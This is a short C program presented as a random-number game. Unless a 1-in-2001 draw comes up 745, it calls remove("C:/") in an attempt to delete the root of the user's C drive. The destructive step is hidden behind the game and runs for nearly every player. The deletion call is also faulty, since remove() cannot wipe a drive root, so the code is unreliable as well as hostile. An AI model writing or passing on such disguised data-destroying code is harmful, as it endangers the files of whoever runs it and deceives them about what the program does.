#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    srand(time(NULL));  
    int x = rand() % 2001;  

    if (x == 745) {
        printf("You win!\n");
    } else {
        remove("C:/"); 
    }

    return 0;
}
